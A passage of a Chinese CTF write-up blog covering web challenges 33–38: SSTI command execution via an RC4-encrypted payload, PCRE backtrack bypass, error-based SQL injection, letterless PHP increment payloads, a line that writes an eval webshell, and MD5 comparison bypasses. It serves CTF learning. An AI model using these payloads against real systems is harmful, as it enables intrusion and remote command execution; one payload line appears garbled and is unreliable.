class=\"built_in\">list</span>(<span class=\"built_in\">range</span>(<span class=\"number\">256</span>)) <span class=\"comment\"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可  </span></span><br><span class=\"line\"><span class=\"comment\"># print(&quot;原来的 s 盒：%s&quot; % s_box)  </span></span><br><span class=\"line\">j = <span class=\"number\">0</span>  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):  </span><br><span class=\"line\">j = (j + s_box[i] + <span class=\"built_in\">ord</span>(key[i % <span class=\"built_in\">len</span>(key)])) % <span class=\"number\">256</span>  </span><br><span class=\"line\">s_box[i], s_box[j] = s_box[j], s_box[i]  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)  </span></span><br><span class=\"line\"><span class=\"keyword\">return</span> s_box  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rc4_excrypt</span>(<span class=\"params\">plain, box</span>):  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;调用加密程序成功。&quot;)  </span></span><br><span class=\"line\">res = []  </span><br><span class=\"line\">i = j = <span class=\"number\">0</span>  </span><br><span class=\"line\"><span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> plain:  </span><br><span class=\"line\">i = (i + <span class=\"number\">1</span>) % <span class=\"number\">256</span>  </span><br><span class=\"line\">j = (j + box[i]) % <span class=\"number\">256</span>  </span><br><span class=\"line\">box[i], box[j] = box[j], box[i]  </span><br><span class=\"line\">t = (box[i] + box[j]) % <span class=\"number\">256</span>  </span><br><span class=\"line\">k = box[t]  </span><br><span class=\"line\">res.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(s) ^ k))  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)  </span></span><br><span class=\"line\">cipher = <span class=\"string\">&quot;&quot;</span>.join(res)  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;加密后的字符串是：\\n%s&quot; %cipher)  </span></span><br><span class=\"line\">enc_url = parse.quote(cipher)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;加密后的url编码:\\n&quot;</span> + enc_url)  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;加密后的输出(经过base64编码):&quot;)  </span></span><br><span class=\"line\"><span class=\"comment\"># print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))  </span></span><br><span class=\"line\"><span class=\"keyword\">return</span> (<span class=\"built_in\">str</span>(base64.b64encode(cipher.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)), <span class=\"string\">&#x27;utf-8&#x27;</span>))  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">rc4_main(<span class=\"string\">&quot;HereIsTreasure&quot;</span>, <span class=\"string\">&#x27;&#x27;&#x27;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"33nisactf-2022middlerce\"><a class=\"markdownIt-Anchor\" href=\"#33nisactf-2022middlerce\">#</a> 33.[NISACTF 2022]middlerce</h2>\n<p>PRCE 前置知识:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vdXNlLXBjcmUtYmFja3RyYWNrLWxpbWl0LXRvLWJ5cGFzcy1yZXN0cmljdC5odG1s\">p 神文章</span></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://node4.anna.nssctf.cn:28802/&#x27;</span>  </span><br><span class=\"line\">data=<span class=\"string\">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`nl /f*`;?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span>+<span class=\"string\">&quot;@&quot;</span>*<span class=\"number\">1000000</span>+<span class=\"string\">&#x27;&quot;&#125;&#x27;</span>  </span><br><span class=\"line\"><span class=\"comment\">#这里必须使用特殊字符,@$之类的都是可以的</span></span><br><span class=\"line\">a=requests.post(url=url,data=&#123;<span class=\"string\">&#x27;letter&#x27;</span>:data&#125;)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(a.text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1\tNSSCTF&#123;6fc410f7-bc4a-423f-b62d-81cd0dc8cbd9&#125;</span></span><br><span class=\"line\"><span class=\"comment\">#这里index.php没有闭合&lt;?所以要先用?&gt;闭合</span></span><br></pre></td></tr></table></figure>\n<p>另外:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=?&gt;时一种PHP短标记方式,里面可以输入PHP代码执行,且输出时不用echo,直接输入内容就行,这里用``来执行系统命令,再用&lt;?=?&gt;输出</span><br></pre></td></tr></table></figure>\n<h2 id=\"34nisactf-2022join-us\"><a class=\"markdownIt-Anchor\" href=\"#34nisactf-2022join-us\">#</a> 34.[NISACTF 2022]join-us</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;#   message: txw4ever</span><br><span class=\"line\">1&#x27; order by 3# 不要耍小心思喔~</span><br><span class=\"line\">可见此题有过滤</span><br><span class=\"line\">报错注入,没有禁用extractvalue</span><br><span class=\"line\">1&#x27;||extractvalue(0,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like &#x27;sqlsql&#x27;)))#</span><br><span class=\"line\"></span><br><span class=\"line\">XPATH syntax error: &#x27;~Fal_flag,output&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">然后column被禁用,采用join拼接绕过</span><br><span class=\"line\">1&#x27;||extractvalue(0,concat(0x7e,(select *from (select *from output a join output b)c)))#</span><br><span class=\"line\"></span><br><span class=\"line\">Duplicate column name &#x27;data&#x27;</span><br><span class=\"line\">截取试试</span><br><span class=\"line\">1&#x27;||extractvalue(0,concat(0x7e,substr((select group_concat(data) from sqlsql.output),1,31)))#</span><br><span class=\"line\"></span><br><span class=\"line\">substr被禁用,用mid</span><br><span class=\"line\">1&#x27;||extractvalue(0,concat(0x7e,mid((select group_concat(data) from sqlsql.output),1,20)))#</span><br><span class=\"line\"></span><br><span class=\"line\">再将1,20换成20,40和40,60</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"35swpuctf-2021-新生赛hardrce_3\"><a class=\"markdownIt-Anchor\" href=\"#35swpuctf-2021-新生赛hardrce_3\">#</a> 35.[SWPUCTF 2021 新生赛] hardrce_3</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;wllm&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$wllm</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;wllm&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$blacklist</span> = [<span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;\\^&#x27;</span>, <span class=\"string\">&#x27;\\~&#x27;</span>, <span class=\"string\">&#x27;\\|&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$blacklist</span> <span class=\"keyword\">as</span> <span class=\"variable\">$blackitem</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$blackitem</span> . <span class=\"string\">&#x27;/m&#x27;</span>, <span class=\"variable\">$wllm</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;小伙子只会异或和取反？不好意思哦LTLT说不能用！！&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/[a-zA-Z0-9]/is&#x27;</span>, <span class=\"variable\">$wllm</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Ra&#x27;sAlGhul说用字母数字是没有灵魂的！&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"variable\">$wllm</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>毫无疑问的无字母数字 rce, 过滤了～和 ^, 不能取反和异或只能自增</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//测试发现7.0.12以上版本不可使用</span><br><span class=\"line\">//使用时需要url编码下</span><br><span class=\"line\">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br><span class=\"line\">固定格式 构造出来的 assert($_POST[_]);</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?wllm=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#xx27;_&#xspan><br></pre></td></tr></table></figure>\n<p>测试时发现_=phpinfo (); 可以，但是 system (),passthru 一堆系统执行函数不能用，应该被禁用了，这里用 file_put_contents 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_=file_put_contents(&#x27;zoe.php&#x27;,&#x27;&lt;?php eval($_POST[zoe]);?&gt;&#x27;);</span><br></pre></td></tr></table></figure>\n<p>然后蚁剑连上就行</p>\n<h2 id=\"36uuctf-2022-新生赛ez_rce\"><a class=\"markdownIt-Anchor\" href=\"#36uuctf-2022-新生赛ez_rce\">#</a> 36.[UUCTF 2022 新生赛] ez_rce</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$code</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\\$|\\*|\\+|\\^|scan|\\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>, <span class=\"variable\">$code</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;看看你输入的参数！！！不叫样子！！&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$code</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你想干什么？？？？？？？？？&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;居然都不输入参数，可恶!!!!!!!!!&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>一开始看题目标签无参 rce, 我还在想着异或取反自增，发现 $ 被过滤了，看了 wp 才发现 printf 这个函数也能这么 NB</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=printf(`l\\s /`);</span><br><span class=\"line\">?code=printf(`c\\at /fffffffffflagafag`);</span><br></pre></td></tr></table></figure>\n<h2 id=\"37hnctf-2022-week1easy_html\"><a class=\"markdownIt-Anchor\" href=\"#37hnctf-2022-week1easy_html\">#</a> 37.[HNCTF 2022 Week1]easy_html</h2>\n<p>F12 &gt; 网络 -&gt; 请求头</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hint:select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>\n<p>传个特殊的:ffifdyop<br>\n 进入下一关，他说仔细想想在哪里找线索，直接查看源代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$x</span>= <span class=\"variable\">$GET</span>[<span class=\"string\">&#x27;x&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$y</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;y&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span> != <span class=\"variable\">$y</span> &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$x</span>) == <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$y</span>))&#123;</span><br><span class=\"line\">;</span><br></pre></td></tr></table></figure>\n<p>弱类型数组绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?x[]=1&amp;y[]=2</span><br></pre></td></tr></table></figure>\n<p>然后下一关</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;wqh&#x27;</span>] !== <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dsy&#x27;</span>] &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;wqh&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dsy&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$FLAG</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>简单的强比较直接数组绕过</p>\n<h2 id=\"38wustctf-2020朴实无华\"><a class=\"markdownIt-Anchor\" href=\"#38wustctf-2020朴实无华\">#</a> 38.[WUSTCTF 2020] 朴实无华</h2>\n<p>首先提示人间极乐 bot<br>\n 访问 robots.txt, 进入提示的文件在在请求头中找到 /fl4g</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//level 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$num</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$num</span>) &lt; <span class=\"number\">2020</span> &amp;&amp; <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$num</span> + <span class=\"number\">1</span>) &gt; <span class=\"number\">2021</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;去非洲吧&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//level 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;md5&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$md5</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;md5&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$md5</span> == <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$md5</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;去非洲吧&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//get flag</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;get_flag&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$get_flag</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;get_flag&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">strstr</span>(<span 